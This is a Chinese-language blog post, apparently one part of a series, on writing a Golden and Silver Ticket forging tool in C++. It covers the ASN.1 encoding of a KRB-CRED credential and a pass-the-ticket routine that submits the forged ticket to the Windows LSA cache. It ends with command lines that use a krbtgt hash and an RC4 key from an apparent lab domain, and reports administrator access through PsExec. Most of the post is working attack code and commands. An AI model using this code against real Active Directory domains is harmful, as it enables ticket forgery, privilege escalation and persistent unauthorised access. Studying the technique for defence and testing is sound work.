现在我们需要做的是，使用 ASN.1 编码规则，构建一个票据 KRB\_CRED 类型的数据结构，并将其序列化为一个`PBERVAL`结构体，该结构体包含了 ASN.1 编码的数据和数据长度。该过程被写在 `GenerateAppKrbCred()` 函数中，该函数与前文中的 `GenerateAppEncTicketPart()` 函数类似，如下所示。

{% raw %}

```c++
PBERVAL GenerateAppKrbCred(PKERBEROS_TICKET pTicket)
{
    BerElement* pBer, * pBerEnc;
    PBERVAL pBerVal = NULL, pBerValEnc = NULL;

    if (pBer = ber_alloc_t(LBER_USE_DER))
    {
        ber_printf(pBer, (PSTR)"t{{t{i}t{i}t{", MAKE_APP_TAG(ID_APP_KRB_CRED), MAKE_CTX_TAG(ID_CTX_KRB_CRED_PVNO), KERBEROS_VERSION, MAKE_CTX_TAG(ID_CTX_KRB_CRED_MSG_TYPE), ID_APP_KRB_CRED, MAKE_CTX_TAG(ID_CTX_KRB_CRED_TICKETS));
        ber_printf(pBer, (PSTR)"{t{{t{i}t{", MAKE_APP_TAG(ID_APP_TICKET), MAKE_CTX_TAG(ID_CTX_TICKET_TKT_VNO), KERBEROS_VERSION, MAKE_CTX_TAG(ID_CTX_TICKET_REALM));

        ASN1GeneralStringFromUnicodeString(pBer, &pTicket->DomainName);
        ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_TICKET_SNAME));
        CreateSequencePrincipalName(pBer, pTicket->ServiceName);
        ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_TICKET_ENC_PART));
        CreateSequenceEncryptedData(pBer, pTicket->TicketEncType, pTicket->TicketKvno, pTicket->EncTicketPart.Value, pTicket->EncTicketPart.Length);
        ber_printf(pBer, (PSTR)"}}}}");

        ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRB_CRED_ENC_PART));
        if (pBerEnc = ber_alloc_t(LBER_USE_DER))
        {
            ber_printf(pBerEnc, (PSTR)"t{{t{{{t{", MAKE_APP_TAG(ID_APP_ENCKRBCREDPART), MAKE_CTX_TAG(ID_CTX_ENCKRBCREDPART_TICKET_INFO), MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_KEY));
            GreateSequenceEncryptionKey(pBerEnc, pTicket->KeyType, pTicket->Key.Value, pTicket->Key.Length);
            ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PREALM));
            ASN1GeneralStringFromUnicodeString(pBerEnc, &pTicket->AltTargetDomainName);
            ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PNAME));
            CreateSequencePrincipalName(pBerEnc, pTicket->ClientName);
            ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_FLAGS));
            ASN1BitStringFromULONG(pBerEnc, pTicket->TicketFlags);
            ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_STARTTIME));
            ASN1GeneralizedTimeFromFileTime(pBerEnc, &pTicket->StartTime);
            ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_ENDTIME));
            ASN1GeneralizedTimeFromFileTime(pBerEnc, &pTicket->EndTime);
            ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_RENEW_TILL));
            ASN1GeneralizedTimeFromFileTime(pBerEnc, &pTicket->RenewUntil);
            ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SREALM));
            ASN1GeneralStringFromUnicodeString(pBerEnc, &pTicket->DomainName);
            ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SNAME));
            CreateSequencePrincipalName(pBerEnc, pTicket->ServiceName);
            ber_printf(pBerEnc, (PSTR)"}}}}}}");

            if (ber_flatten(pBerEnc, &pBerValEnc) >= 0)
            {
                CreateSequenceEncryptedData(pBer, KERB_ETYPE_NULL, 0, pBerValEnc->bv_val, pBerValEnc->bv_len);
            }
            ber_free(pBerEnc, 1);
        }
        ber_printf(pBer, (PSTR)"}}}");
        ber_flatten(pBer, &pBerVal);
        ber_bvfree(pBerValEnc);
        ber_free(pBer, 1);
    }
    return pBerVal;
}
```

{% endraw %}

首先构建 `KRB-CRED` 结构的 `pvno` 和 `msg-type` 成员：

{% raw %}

```c++
ber_printf(pBer, (PSTR)"t{{t{i}t{i}t{", MAKE_APP_TAG(ID_APP_KRB_CRED), MAKE_CTX_TAG(ID_CTX_KRB_CRED_PVNO), KERBEROS_VERSION, MAKE_CTX_TAG(ID_CTX_KRB_CRED_MSG_TYPE), ID_APP_KRB_CRED, MAKE_CTX_TAG(ID_CTX_KRB_CRED_TICKETS));
```

{% endraw %}

然后开始前面构造并临时存储的票据结构封装到 `KRB-CRED` 结构中：

{% raw %}

```c++
ber_printf(pBer, (PSTR)"{t{{t{i}t{", MAKE_APP_TAG(ID_APP_TICKET), MAKE_CTX_TAG(ID_CTX_TICKET_TKT_VNO), KERBEROS_VERSION, MAKE_CTX_TAG(ID_CTX_TICKET_REALM));

ASN1GeneralStringFromUnicodeString(pBer, &pTicket->DomainName);
ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_TICKET_SNAME));
CreateSequencePrincipalName(pBer, pTicket->ServiceName);
ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_TICKET_ENC_PART));
CreateSequenceEncryptedData(pBer, pTicket->TicketEncType, pTicket->TicketKvno, pTicket->EncTicketPart.Value, pTicket->EncTicketPart.Length);
ber_printf(pBer, (PSTR)"}}}}");
```

{% endraw %}

需要按照前文中描述的 Ticket 在 ASN.1 中的定义形式，包括 `tkt-vno`、`realm`、`sname` 和 `enc-part` 四个成员：

```cpp
Ticket          ::= [APPLICATION 1] SEQUENCE {
        tkt-vno         [0] INTEGER (5),
        realm           [1] Realm,
        sname           [2] PrincipalName,
        enc-part        [3] EncryptedData -- EncTicketPart
}
```

之后，开始构造 `KRB-CRED` 结构的 `enc-part` 成员，包括 `ticket-info`、`nonce`、`timestamp`、`usec`、`s-address` 和 `r-address` 成员，但是这里至构建了 `ticket-info` 这一个成员，其他成员都是可选的。

{% raw %}

```c++
ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRB_CRED_ENC_PART));
if (pBerEnc = ber_alloc_t(LBER_USE_DER))
{
    ber_printf(pBerEnc, (PSTR)"t{{t{{{t{", MAKE_APP_TAG(ID_APP_ENCKRBCREDPART), MAKE_CTX_TAG(ID_CTX_ENCKRBCREDPART_TICKET_INFO), MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_KEY));
    GreateSequenceEncryptionKey(pBerEnc, pTicket->KeyType, pTicket->Key.Value, pTicket->Key.Length);
    ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PREALM));
    ASN1GeneralStringFromUnicodeString(pBerEnc, &pTicket->AltTargetDomainName);
    ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_PNAME));
    CreateSequencePrincipalName(pBerEnc, pTicket->ClientName);
    ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_FLAGS));
    ASN1BitStringFromULONG(pBerEnc, pTicket->TicketFlags);
    ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_STARTTIME));
    ASN1GeneralizedTimeFromFileTime(pBerEnc, &pTicket->StartTime);
    ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_ENDTIME));
    ASN1GeneralizedTimeFromFileTime(pBerEnc, &pTicket->EndTime);
    ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_RENEW_TILL));
    ASN1GeneralizedTimeFromFileTime(pBerEnc, &pTicket->RenewUntil);
    ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SREALM));
    ASN1GeneralStringFromUnicodeString(pBerEnc, &pTicket->DomainName);
    ber_printf(pBerEnc, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_KRBCREDINFO_SNAME));
    CreateSequencePrincipalName(pBerEnc, pTicket->ServiceName);
    ber_printf(pBerEnc, (PSTR)"}}}}}}");

    if (ber_flatten(pBerEnc, &pBerValEnc) >= 0)
    {
        CreateSequenceEncryptedData(pBer, KERB_ETYPE_NULL, 0, pBerValEnc->bv_val, pBerValEnc->bv_len);
    }
    ber_free(pBerEnc, 1);
}
```

{% endraw %}

其中，`ticket-info` 成员是 `KrbCredInfo` 类型的序列，包含以下信息，主要来自于封装的票据中的 EncTicketPart 部分成员，如下所示。

```cpp
KrbCredInfo     ::= SEQUENCE {
        key             [0] EncryptionKey,
        prealm          [1] Realm OPTIONAL,
        pname           [2] PrincipalName OPTIONAL,
        flags           [3] TicketFlags OPTIONAL,
        authtime        [4] KerberosTime OPTIONAL,
        starttime       [5] KerberosTime OPTIONAL,
        endtime         [6] KerberosTime OPTIONAL,
        renew-till      [7] KerberosTime OPTIONAL,
        srealm          [8] Realm OPTIONAL,
        sname           [9] PrincipalName OPTIONAL,
        caddr           [10] HostAddresses OPTIONAL
}
```

最后，通过 `ber_flatten()` 函数，获取 `KRB_CRED` 结构经过 BER 编码规则编码的任意二进制数据并返回。

至此，所有构造工作都已完成，我们可以将构建好的 `KRB-CRED` 结构数据通过票据传递提交到内存中，如下所示。

```c++
if (isPtt)
{
    status = KerberosPTT(BerAppKrbCred->bv_val, BerAppKrbCred->bv_len);
    if (!status)
    {
        wprintf(L"[-] Failed to pass the kerberos ticket.\n");
        return status;
    }
    wprintf(L"   * Golden ticket for '%s @ %s' successfully submitted for current session.\n", lpUser, lpDomain);
}
```

Pass The Ticket
---------------

票据传递的主要功能函数是 `KerberosPTT()`，该函数定义如下。

```c++
BOOL KerberosPTT(PVOID encodedTicket, ULONG encodedTicketSize)
{
    BOOL status = FALSE;
    NTSTATUS packageStatus;
    PKERB_SUBMIT_TKT_REQUEST pKerbSumbitRequest;
    PVOID pKerbSumbitResponse;
    ULONG submitBufferLength, returnBufferLength;

    submitBufferLength = sizeof(KERB_SUBMIT_TKT_REQUEST) + encodedTicketSize;
    pKerbSumbitRequest = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitBufferLength);

    pKerbSumbitRequest->MessageType = KerbSubmitTicketMessage;
    pKerbSumbitRequest->KerbCredSize = encodedTicketSize;
    pKerbSumbitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
    RtlCopyMemory((PBYTE)pKerbSumbitRequest + pKerbSumbitRequest->KerbCredOffset, encodedTicket, encodedTicketSize);

    status = NT_SUCCESS(LsaCallAuthenticationPackage(hLSA, AuthenticationPackage, pKerbSumbitRequest, submitBufferLength, &pKerbSumbitResponse, &returnBufferLength, &packageStatus));
    if (!status || !NT_SUCCESS(packageStatus))
    {
        wprintf(L"[-] LsaCallAuthenticationPackage Error [%u].\n", GetLastError());
        return status;
    }

    wprintf(L"   * Submit ticket : OK.\n");
    LocalFree(pKerbSumbitRequest);
    return status;
}
```

这里还需要补充一点知识。

### KERB\_SUBMIT\_TKT\_REQUEST

`KERB_SUBMIT_TKT_REQUEST` 结构用于向 Kerberos 颁发机构（KDC）提交票据请求。该结构体没有公开在微软文档中，其定义如下。

```c++
typedef struct _KERB_SUBMIT_TKT_REQUEST {
    KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    LUID LogonId;
    ULONG Flags;
    KERB_CRYPTO_KEY32 Key; // key to decrypt KERB_CRED
    ULONG KerbCredSize;
    ULONG KerbCredOffset;
} KERB_SUBMIT_TKT_REQUEST, *PKERB_SUBMIT_TKT_REQUEST;  
```

- MessageType：标识正在发出的请求类型的 KERB\_PROTOCOL\_MESSAGE\_TYPE 值。此成员必须设置为 KerbSubmitTicketMessage。
- Key：用于解密 Kerberos 凭据（KRB\_CRED）的加密密钥。
- KerbCredSize：表示 KRB\_CRED 数据的大小（以字节为单位），即 KRB\_CRED 凭据的长度。
- KerbCredOffset：表示 KRB\_CRED 数据在整个消息中的偏移量，即 Kerberos 凭据的起始位置。

`KerbSubmitTicketMessage` 调度例程从 KDC 获取票证并更新票证缓存。需要 SeTcbPrivilege 才能访问另一个登录帐户的票证缓存。

在 `LsaCallAuthenticationPackage()` 函数中使用 `KERB_SUBMIT_TKT_REQUEST` 时，需要扩展 `KERB_SUBMIT_TKT_REQUEST` 结构体的大小，将 `KRB_CRED` 数据追加到 `KERB_SUBMIT_TKT_REQUEST` 结构后面，并将 `KRB_CRED` 数据在整个 `KERB_SUBMIT_TKT_REQUEST` 消息中的偏移量给到 `KerbCredOffset`。

Mimikatz 的 `kerberos::ptt` 通过 `LsaCallAuthenticationPackage` 函数发送 `KERB_SUBMIT_TKT_REQUEST` 消息，将现有的 Kerberos 票据传递（文件或二进制数据）到内存中。

`KerberosPTT()` 函数首先声明了一个 `KERB_SUBMIT_TKT_REQUEST` 结构的指针变量 `pKerbSumbitRequest`。然后扩展了 `KERB_SUBMIT_TKT_REQUEST` 结构的大小，如下所示。

```c++
submitBufferLength = sizeof(KERB_SUBMIT_TKT_REQUEST) + encodedTicketSize;
pKerbSumbitRequest = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitBufferLength);
```

这里 `pKerbSumbitRequest` 在原来 `sizeof(KERB_SUBMIT_TKT_REQUEST)` 大小的基础上增加了 `encodedTicketSize`，以保证后续将票据数据追加到 `pKerbSumbitRequest` 指向的内存中。

然后设置 `pKerbSumbitRequest` 中的成员，必须将 `MessageType` 成员设为 `KerbSubmitTicketMessage`，`KerbCredSize` 设为之前构建好的 `KRB-CRED` 结构数据的大小，`KerbCredOffset` 设置追加的 `KRB-CRED` 数据相对于 `KERB_SUBMIT_TKT_REQUEST` 结构起始位置的偏移量，并通过 `RtlCopyMemory` 将票据数据追加到 `pKerbSumbitRequest` 扩展出来的内存中，如下所示。

```c++
pKerbSumbitRequest->MessageType = KerbSubmitTicketMessage;
pKerbSumbitRequest->KerbCredSize = encodedTicketSize;
pKerbSumbitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
RtlCopyMemory((PBYTE)pKerbSumbitRequest + pKerbSumbitRequest->KerbCredOffset, encodedTicket, encodedTicketSize);
```

最后，通过调用 `LsaCallKerberosPackage()` 函数发送 `KerbSubmitTicketMessage` 消息请求，将该票据提交到当前会话缓存中，完成票据传递过程。

```c++
status = NT_SUCCESS(LsaCallAuthenticationPackage(hLSA, AuthenticationPackage, pKerbSumbitRequest, submitBufferLength, &pKerbSumbitResponse, &returnBufferLength, &packageStatus));
```

Let’s see it in action
======================

执行以下命令，伪造一个黄金票据。如下图所示，伪造票据后，成功通过 PsExec 获取目标服务器权限。

```console
GoldenTicket.exe /user:Administrator /domain:pentest.com /sid:S-1-5-21-1536491439-3234161155-253608391 /krbtgt:6b88c9ed6723e3de59eb76f5b73f6a69 /ptt
```

![](images/attach-511fc416dd6141d1d8736da392f66aa93d35c1b0.png)

执行以下命令，伪造一个目标服务器上 LDAP 服务的白银票据，并传递到内存中，如下图所示。

```console
GoldenTicket.exe /domain:pentest.com /sid:S-1-5-21-1536491439-3234161155-253608391 /target:dc01.pentest.com /rc4:8236c3452e65add7b5756945975fd883 /service:ldap /user:Administrastor /ptt
```

![](images/attach-a362439fed46d3a5de8b908e228e76dc02e5b526.png)
